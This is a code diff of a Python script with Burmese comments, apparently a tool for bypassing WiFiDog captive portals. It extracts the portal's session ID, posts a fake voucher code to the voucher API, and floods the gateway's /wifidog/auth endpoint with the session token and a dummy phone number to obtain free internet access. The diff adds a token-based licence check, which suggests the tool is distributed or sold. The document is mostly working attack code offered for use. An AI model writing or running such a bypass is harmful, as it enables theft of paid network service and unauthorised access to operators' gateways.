@@ -6,18 +6,36 @@ import threading
 import os
 import sys
 import psutil
+import json
 from urllib.parse import urlparse, parse_qs, urljoin
 
 # SSL Warning များကို ပိတ်ထားရန်
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# --- CONFIGURATION (ပြင်ဆင်ထားသောနေရာ) ---
+# --- CONFIGURATION ---
 TOKEN_URL = "https://raw.githubusercontent.com/demoppal/demo/refs/heads/main/token.txt"
+EXPIRE_LOG = ".expired_tokens.json"  # Expire ဖြစ်သွားသော Token များမှတ်ရန်ဖိုင်
 PING_THREADS = 5
 PING_INTERVAL = 0.1 
 
 def clear_screen():
     os.system('clear' if os.name == 'posix' else 'cls')
+
+def load_expired_tokens():
+    """သိမ်းထားသော Expired Token များကို ဖတ်ရန်"""
+    if os.path.exists(EXPIRE_LOG):
+        try:
+            with open(EXPIRE_LOG, "r") as f:
+                return json.load(f)
+        except: return {}
+    return {}
+
+def save_expired_token(token):
+    """Token သက်တမ်းကုန်ဆုံးပါက မှတ်တမ်းသွင်းရန်"""
+    data = load_expired_tokens()
+    data[token] = "expired"
+    with open(EXPIRE_LOG, "w") as f:
+        json.dump(data, f)
 
 def show_banner():
     clear_screen()
@@ -34,7 +52,6 @@ def show_banner():
     print(banner)
 
 def get_data_usage():
-    """လက်ရှိ အသုံးပြုနေတဲ့ Total Data Usage (MB) ကို တွက်ချက်ရန်"""
     try:
         net_io = psutil.net_io_counters()
         total_bytes = net_io.bytes_sent + net_io.bytes_recv
@@ -42,16 +59,18 @@ def get_data_usage():
     except: return 0
 
 def get_valid_token():
-    """GitHub မှ Token နံပါတ်တောင်းပြီး စစ်ဆေးခြင်း"""
     try:
         show_banner()
-        print("\033[1;33m[*] Enter Token Number to Activate Access:\033[0m")
-        user_token = input("> ").strip()
+        user_token = input("\033[1;33m[*] Enter Token Number to Activate Access:\033[0m\n> ").strip()
         
-        # Cache မဖြစ်အောင် headers ထည့်သည် (Real-time data ရရန်)
+        # အရင်ဆုံး သုံးပြီးသား Token ဟုတ်မဟုတ်စစ်မည်
+        expired_list = load_expired_tokens()
+        if user_token in expired_list:
+            print("\n\033[1;31m[!] This token has already EXPIRED and cannot be used again!\033[0m")
+            sys.exit()
+        
         headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}
         response = requests.get(TOKEN_URL, headers=headers, timeout=10)
-        
         allowed_data = response.text.splitlines()
         
         for entry in allowed_data:
@@ -60,7 +79,7 @@ def get_valid_token():
                 if token_num == user_token:
                     print(f"\033[1;32m[+] Token Accepted! Duration: {token_time} minutes.\033[0m")
                     time.sleep(1)
-                    return int(token_time)
+                    return user_token, int(token_time)
         
         print(f"\n\033[1;31m[!] Invalid Token! {user_token} is not valid.\033[0m")
         sys.exit()
@@ -71,36 +90,29 @@ def get_valid_token():
 
 def check_real_internet():
     try:
-        # Google ကို စမ်းသပ်ပြီး အင်တာနက်ရမရ စစ်ဆေးခြင်း
         return requests.get("http://www.google.com", timeout=3).status_code == 200
     except: return False
 
 def high_speed_ping(auth_link, session, sid):
-    """Auth Link ကို အဆက်မပြတ် Request ပို့ပေးခြင်း (Turbo Mode)"""
     while True:
         try:
             session.get(auth_link, timeout=5)
-            # အောက်က စာသားသည် Status ကို တောက်လျှောက်ပြနေမည်
             print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
         except: break
         time.sleep(PING_INTERVAL)
 
 def start_process():
-    # Token နံပါတ်တောင်းခြင်း
-    token_minutes = get_valid_token()
+    # Token နှင့် မိနစ်ကို ရယူသည်
+    token_name, token_minutes = get_valid_token()
     
-    # အချိန်မှတ်ထားခြင်း (စစချင်းအချိန်)
     start_session_time = time.time()
     token_limit = start_session_time + (token_minutes * 60)
     
-    # Internet Access ရွေးချယ်ခြင်း Menu
     show_banner()
     print(f"\033[1;32m[+] Session Valid for: {token_minutes} minutes.\033[0m")
-    print(f"\n\033[1;33m[1] Start SWT Turbo Internet")
-    print("[0] Exit\033[0m")
-    choice = input("\nSelect Option: ")
-    if choice != '1':
-        print("Exiting...")
+    print(f"\n\033[1;33m[1] Start SWT Turbo Internet\n[0] Exit\033[0m")
+    
+    if input("\nSelect Option: ") != '1':
         sys.exit()
         
     clear_screen()
@@ -111,9 +123,11 @@ def start_process():
     start_data = get_data_usage()
 
     while True:
-        # အချိန်ကုန်မကုန် အမြဲစစ်ခြင်း
-        if time.time() > token_limit:
-            print("\n\033[1;31m[!] Token Expired! Please get a new token.\033[0m")
+        # အချိန်ကုန်မကုန် စစ်ဆေးခြင်း
+        current_now = time.time()
+        if current_now > token_limit:
+            print("\n\n\033[1;31m[!] Token Expired! Please get a new token.\033[0m")
+            save_expired_token(token_name) # Expire ဖြစ်သွားကြောင်း မှတ်တမ်းတင်သည်
             sys.exit()
 
         session = requests.Session()
@@ -121,27 +135,24 @@ def start_process():
         
         try:
             r = requests.get(test_url, allow_redirects=True, timeout=5)
-            # အင်တာနက် တိုက်ရိုက်ရနေလျှင်
             if r.url == test_url:
                 if check_real_internet():
                     elapsed = time.time() - start_time
                     mins, secs = divmod(int(elapsed), 60)
                     hours, mins = divmod(mins, 60)
                     
-                    # ကျန်ရှိသော Token အချိန်
-                    remaining = int((token_limit - time.time()) / 60)
+                    remaining_sec = token_limit - time.time()
+                    rem_m, rem_s = divmod(int(remaining_sec), 60)
                     
                     current_data = get_data_usage() - start_data
-                    print(f"\r\033[1;36m[*] Time: {hours:02d}:{mins:02d}:{secs:02d} | Used: {current_data:.2f} MB | Token: {remaining} min | Status: OK\033[0m", end='', flush=True)
+                    print(f"\r\033[1;36m[*] Time: {hours:02d}:{mins:02d}:{secs:02d} | Used: {current_data:.2f} MB | Left: {rem_m:02d}:{rem_s:02d} | Status: OK\033[0m", end='', flush=True)
                     time.sleep(5)
                     continue
             
-            # Captive Portal သို့ Redirect ဖြစ်နေလျှင် (Login Page)
             portal_url = r.url
             parsed_portal = urlparse(portal_url)
             portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
             
-            # SID ရှာဖွေခြင်း Logic
             r1 = session.get(portal_url, verify=False, timeout=10)
             path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
             next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
@@ -153,34 +164,30 @@ def start_process():
                 sid = sid_match.group(1) if sid_match else None
             
             if sid:
-                # Voucher Activation (Fake Activation)
                 voucher_api = f"{portal_host}/api/auth/voucher/"
                 try:
-                    v_res = session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
-                    print(f"\n[+] Voucher API Attempted: {v_res.status_code}")
-                except:
-                    pass
+                    session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+                except: pass
 
-                # Gateway Info
                 params = parse_qs(parsed_portal.query)
                 gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                 gw_port = params.get('gw_port', ['2060'])[0]
                 auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
 
-                print(f"[*] SID Found: {sid} | Starting Turbo Threads...")
-
-                # Thread များဖြင့် Ping ပို့ခြင်းကို စတင်ရန်
                 for _ in range(PING_THREADS):
                     threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()
 
-                # အင်တာနက် ပုံမှန်ပြန်မပြတ်မချင်း စောင့်နေရန်
                 while check_real_internet():
+                    if time.time() > token_limit: break
                     time.sleep(5)
 
         except Exception:
-            # Error တက်ပါက ၅ စက္ကန့်နားပြီး ပြန်ကြိုးစားရန်
             time.sleep(5)
 
 if __name__ == "__main__":
-    start_process()
-  
+    try:
+        start_process()
+    except KeyboardInterrupt:
+        print("\n\nStopped by User.")
+        sys.exit()
+        
